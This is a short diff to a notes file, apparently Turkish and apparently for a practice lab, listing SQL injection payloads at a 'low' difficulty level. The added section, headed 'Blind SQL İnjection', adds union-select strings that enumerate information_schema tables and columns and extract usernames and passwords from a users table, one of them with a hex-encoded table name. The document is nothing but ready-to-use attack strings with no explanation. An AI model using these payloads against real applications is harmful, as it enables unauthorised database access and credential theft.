@@ -3,3 +3,12 @@ low Seviye
 1' and 1=1 union select database(),user()#
 1' and 1=1 union select null,table_name from information_schema.tables#
 1' and 1=1 union select user,password from users#
+
+
+Blind SQL İnjection
+
+1' and 1=0 union select null,table_name from information_schema.tables#
+1' and 1=0 union select null,table_name from information_schema.columns where table_name='users'#
+1' and 1=0 union select null,concat(table_name,0x0a,column_name) from information_schema.columns where table_name='users'#
+1' and 1=0 union select null,concat(first_name,0x0a,password) from users #
+1 and 1=0 union select table_name,column_name from information_schema.columns where table_name=0x7573657273
